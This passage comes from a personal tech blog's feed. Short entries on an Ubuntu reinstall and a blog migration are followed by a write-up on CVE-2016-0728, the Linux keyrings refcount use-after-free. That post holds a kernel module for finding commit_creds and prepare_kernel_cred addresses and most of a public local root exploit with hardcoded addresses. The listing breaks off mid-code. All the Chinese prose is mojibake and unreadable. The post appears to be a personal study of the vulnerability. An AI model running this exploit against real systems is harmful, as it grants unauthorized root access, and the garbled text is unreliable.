systemd-logind</span><br></pre></td></tr></table></figure><p>å†è£…äº›æœ‰çš„æ²¡çš„å¸¸ç”¨è½¯ä»¶ï¼Œå·®ä¸å¤šåŸºæœ¬é…ç½®å°±OKäº†ï¼Œåé¢å„ä¸ªç¯å¢ƒå…¨éƒ¨dockeråŒ–å§ï¼ŒUbuntuç¯å¢ƒä¹±äº†å¾ˆéš¾å—ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;ä¹‹å‰åœ¨ä¸€å·æœ¬ï¼ˆOneMix3 Proï¼‰ä¸Šè£…çš„Ubuntuç³»ç»Ÿå› ä¸ºæ‡’å¾—åšç¯å¢ƒåˆ†ç¦»ï¼Œç»ˆäºæŠŠç¯å¢ƒæä¹±äº† T_Tï¼Œé‚é‡è£…ä¸€ä¸‹Ubuntué¡ºä¾¿å‡åˆ°æœ€æ–°ç‰ˆ20.04ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€å·æœ¬æœ‰ç‚¹ZZï¼Œä¸»æ¿å±‚é¢è®¤ä¸ºå±å¹•æ˜¯ç«–ç€çš„ï¼Œæ‰€ä»¥é™¤åŸç”Ÿ win10 ï¼ŒåŠ äº†grubä¹‹åï¼Œgrubå’Œubuntué»˜è®¤éƒ½æ˜¯ç«–å±çš„ã€‚è€Œä¹‹å‰è£…ç³»ç»Ÿçš„æ—¶å€™æ²¡æœ‰åšè¿‡ç¨‹è®°å½•ï¼Œæ‰€ä»¥å¿˜äº†ä¸Šæ¬¡æ˜¯æ€ä¹ˆè§£å†³â€œç«–å±â€é—®é¢˜çš„äº†ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;é‡æ–°googleä¸€ç•ªï¼Œä¸»è¦å‘ç°ä»¥ä¸‹æ–¹æ³•ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="ubuntu" scheme="https://badb100d.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢è¿ç§»å°è®°</title>
    <link href="https://badb100d.com/2017/08/29/2017-08-29/"/>
    <id>https://badb100d.com/2017/08/29/2017-08-29/</id>
    <published>2017-08-29T15:01:00.000Z</published>
    <updated>2017-08-29T15:01:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>ã€€ã€€ç¿»çœ‹å†å²é‚®ä»¶æƒ³èµ·æ¥å‰æ®µæ—¶é—´farboxå‘bitcronè¿›åŒ–äº†ï¼Œäºæ˜¯æŠ½æ—¶é—´æŠŠåšå®¢ä»æ—§å¹³å°è¿ç§»è¿‡æ¥ï¼Œè¿˜åŠ äº†ä¸ªhttpsã€‚ç”±äºä¹‹å‰ç”¨çš„â€œå¤šè¯´â€è¯„è®ºç³»ç»Ÿå¤±æ•ˆï¼Œå°è¯•äº†ä¸‹disqusï¼Œä¸ç§‘å­¦ä¸Šç½‘è¿è¯„è®ºæ¡†éƒ½çœ‹ä¸åˆ°ã€‚ã€‚ã€‚ã€€ã€€æ¢ç”¨â€œæ¥å¿…ä¹â€è¯•äº†è¯•ï¼Œæ ·å¼å€’æ˜¯ä¸é”™ï¼Œå¯æƒœåŠ è½½å¤ªæ…¢ï¼Œä¹Ÿä¸æ”¯æŒæ—§è¯„è®ºå¯¼å…¥ï¼Œç´¢æ€§å°±æ”¹å›bitcronåŸç”Ÿè¯„è®ºç³»ç»Ÿå§ã€‚åŸç”Ÿè¯„è®ºç³»ç»ŸåŠŸèƒ½æ¯”è¾ƒå•ä¸€ï¼Œå¥½åœ¨æ ¼å¼æ¯”è¾ƒç®€å•ï¼Œæ‰‹åŠ¨æŠŠä»¥å‰å¤šè¯´çš„jsonæ”¹æˆcsvåŒæ­¥äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬æ¢å¤è¿ç§»å‰çš„æ ·å­ã€‚</p><p>ã€€ã€€è¯´èµ·æ¥ä¹Ÿæœ‰ä¸€å¹´å¤šæ²¡å†™ç‚¹ä¸œè¥¿äº†ï¼Œbitcronï¼Œè¿˜æ˜¯è¦cronçš„ï¼Œè¿‡å‡ å¤©è®°å½•ä¸€ä¸‹èƒ½å›æƒ³èµ·æ¥çš„äº‹æƒ…å§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ã€€ã€€ç¿»çœ‹å†å²é‚®ä»¶æƒ³èµ·æ¥å‰æ®µæ—¶é—´farboxå‘bitcronè¿›åŒ–äº†ï¼Œäºæ˜¯æŠ½æ—¶é—´æŠŠåšå®¢ä»æ—§å¹³å°è¿ç§»è¿‡æ¥ï¼Œè¿˜åŠ äº†ä¸ªhttpsã€‚ç”±äºä¹‹å‰ç”¨çš„â€œå¤šè¯´â€è¯„è®ºç³»ç»Ÿå¤±æ•ˆï¼Œå°è¯•äº†ä¸‹disqusï¼Œä¸ç§‘å­¦ä¸Šç½‘è¿è¯„è®ºæ¡†éƒ½çœ‹ä¸åˆ°ã€‚ã€‚ã€‚ã€€ã€€æ¢ç”¨â€œæ¥å¿…ä¹â€è¯•äº†è¯•ï¼Œæ ·å¼å€’æ˜¯ä¸é”™ï¼Œå¯æƒœåŠ è½½å¤ªæ…¢ï¼Œä¹Ÿä¸æ”¯æŒæ—§è¯„è®ºå¯¼å…¥ï¼Œç´¢æ€§å°±æ”¹å›bitcronåŸç”Ÿè¯„è®ºç³»ç»Ÿå§ã€‚åŸç”Ÿè¯„è®ºç³»ç»ŸåŠŸèƒ½æ¯”è¾ƒå•ä¸€ï¼Œå¥½åœ¨æ ¼å¼æ¯”è¾ƒç®€å•ï¼Œæ‰‹åŠ¨æŠŠä»¥å‰å¤šè¯´çš„jsonæ”¹æˆcsvåŒæ­¥äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬æ¢å¤è¿ç§»å‰çš„æ ·å­ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://badb100d.com/categories/life/"/>
    
    
      <category term="life" scheme="https://badb100d.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>çœ‹çœ‹CVE-2016-0728</title>
    <link href="https://badb100d.com/2016/01/27/2016-01-27/"/>
    <id>https://badb100d.com/2016/01/27/2016-01-27/</id>
    <published>2016-01-27T13:11:00.000Z</published>
    <updated>2016-01-27T13:11:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸Šå‘¨æœ«çœ‹äº†ä¸‹<strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">cve-2016-0728<i class="fa fa-external-link"></i></span></strong> linuxæœ¬åœ°ææƒæ¼æ´ï¼Œä»Šå¤©è®°å½•ä¸€ä¸‹ã€‚<br>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯å› ä¸ºkeyringså†…æ ¸ç»„ä»¶çš„å¼•ç”¨æ³„éœ²å¼•èµ·çš„ã€‚<br>æ­¤å†…æ ¸å¯¹è±¡é‡‡ç”¨ä¸€ä¸ª32ä½æ— ç¬¦å·æ•´æ•°åšå¼•ç”¨è®¡æ•°ï¼Œä½†åœ¨å¼•ç”¨è®¡æ•°æº¢å‡ºçš„æ—¶å€™æ²¡æœ‰è¿›è¡Œåˆç†çš„é”™è¯¯å¤„ç†ï¼Œæ‰€ä»¥å½“å¯¹æ­¤å¯¹è±¡å¼•ç”¨åˆ°è¾¾4Gæ—¶ä¼šä½¿å¼•ç”¨è®¡æ•°å›åˆ°0ï¼Œå†…æ ¸åœ¨æ£€æµ‹åˆ°æ­¤å¼•ç”¨è®¡æ•°ä¸º0æ—¶ä¼šææ„å¯¹è±¡é‡Šæ”¾ç©ºé—´ã€‚è€Œæ­¤æ—¶r3ç¨‹åºè¿˜ä¿ç•™æœ‰å†…æ ¸å¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æ­¤å°±å½¢æˆäº†ä¸€ä¸ªUAFæ¼æ´ã€‚<br>å°è±¡ä¸­è¿™ç§æ•´å½¢æº¢å‡ºé€ æˆçš„ä¸¥é‡æ¼æ´è¿˜çœŸä¸å°‘ï¼Œæœ¬ç€å®è·µå‡ºçœŸçŸ¥çš„æ€åº¦å®è·µä¸€ä¸‹ã€‚<br><strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">åŸæ–‡<i class="fa fa-external-link"></i></span></strong>ä¸­æåˆ°ï¼š<br>â€œAddresses of commit_creds and prepare_kernel_cred functions are static and can be determined per Linux kernel version/android device.â€<br>æ‰€ä»¥å…ˆå†™äº†ä¸ªå†…æ ¸æ¨¡å—è·å–è¿™ä¿©å‡½æ•°çš„åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">find_symbol_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">find_symbol_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//æ¨¡å—åŠ è½½å‡½æ•°ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">find_symbol_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * name1= <span class="string">&quot;prepare_kernel_cred&quot;</span>;<span class="comment">//å¾…æŸ¥æ‰¾çš„å†…æ ¸ç¬¦å·çš„åå­—</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * name2= <span class="string">&quot;commit_creds&quot;</span>;<span class="comment">//å¾…æŸ¥æ‰¾çš„å†…æ ¸ç¬¦å·çš„åå­—</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> * <span class="title">ksymbol</span> ;</span>  <span class="comment">// ç”¨äºæ¥æ”¶æµ‹è¯•å‡½æ•°è¿”å›å€¼</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> * <span class="title">owner</span>;</span>            <span class="comment">// å†…æ ¸ç¬¦å·æ‰€å±çš„æ¨¡å—</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *crc;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name[<span class="number">2</span>]=&#123;name1,name2&#125;;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)&#123;</span><br><span class="line"><span class="keyword">bool</span> gplok = <span class="literal">true</span>;                <span class="comment">// æ¨¡å—æ”¯æŒGPL è®¸å¯</span></span><br><span class="line"><span class="keyword">bool</span> warn = <span class="literal">true</span>;                 <span class="comment">// å…è®¸è¾“å‡ºè­¦å‘Šä¿¡æ¯</span></span><br><span class="line">ksymbol = find_symbol(*(name+i),&amp;owner,&amp;crc,gplok,warn);     <span class="comment">//è°ƒç”¨å¾…æµ‹è¯•å‡½æ•°</span></span><br><span class="line"><span class="keyword">if</span>( ksymbol != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*è¾“å‡ºæŸ¥æ‰¾åˆ°çš„å†…æ ¸ç¬¦å·åœ¨å†…å­˜ä¸­çš„åœ°å€*/</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;value : %lx\n&quot;</span>,ksymbol-&gt;value);</span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;name : %s\n&quot;</span>,ksymbol-&gt;name);   <span class="comment">//è¾“å‡ºå†…æ ¸ç¬¦å·åå­—</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;Failed to find symbol %s\n&quot;</span>, *(name+i));</span><br><span class="line"><span class="keyword">if</span>( owner != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*è¾“å‡ºå†…æ ¸ç¬¦å·æ‰€å±çš„æ¨¡å—çš„åå­—*/</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt; owner-&gt;name : %s\n&quot;</span>,owner-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( crc != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*  è¾“å‡ºå†…æ ¸ç¬¦å·çš„crc å€¼æ‰€åœ¨çš„åœ°å€*/</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;*crc : %lx\n&quot;</span>,*crc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¨¡å—é€€å‡ºå‡½æ•°ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">find_symbol_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;module exit ok!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ¨¡å—åŠ è½½ã€é€€å‡ºå‡½æ•°è°ƒç”¨ï¼š</span></span><br><span class="line">module_init(find_symbol_init);</span><br><span class="line">module_exit(find_symbol_exit);</span><br></pre></td></tr></table></figure><p>Googleäº†ä¸€ç•ªå°†å…¶ç¼–è¯‘æˆkoæ–‡ä»¶ï¼Œå†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> åŠ è½½</span></span><br><span class="line">insmod find_symbol.ko</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å¸è½½</span></span><br><span class="line">rmmod find_symbol</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹è¾“å‡º</span></span><br><span class="line">dmesg</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><p>æ ¹æ®è·å–åˆ°çš„ä¸¤ä¸ªå‡½æ•°åœ°å€ä¿®æ”¹<strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">åŸæ–‡<i class="fa fa-external-link"></i></span></strong>ä¸­çš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f */</span></span><br><span class="line"><span class="comment">/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */</span></span><br><span class="line"><span class="comment">/* $ ./cve_2016_072 PP_KEY */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff810957e0)<span class="comment">//got from find_symbol//(0xffffffff81094250)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095ae0)<span class="comment">//got from find_symbol//(0xffffffff81094550)</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line">    <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">    &#125; msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> msqid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line">    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line">    <span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*æ­¤å¤„ä¸ºä¸ªäººæ·»åŠ ï¼Œå¯åŠ¨æ€æ˜¾ç¤ºå†…æ ¸å¯¹è±¡çš„å¼•ç”¨è¿›åº¦*/</span></span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">0xffffff00</span> &amp;&amp; i % <span class="number">429496</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">double</span> tmp=i*<span class="number">1.0</span>/<span class="number">42949670</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\x1b[KProgress: %3.1lf%%\r&quot;</span>,tmp);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************************/</span></span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span 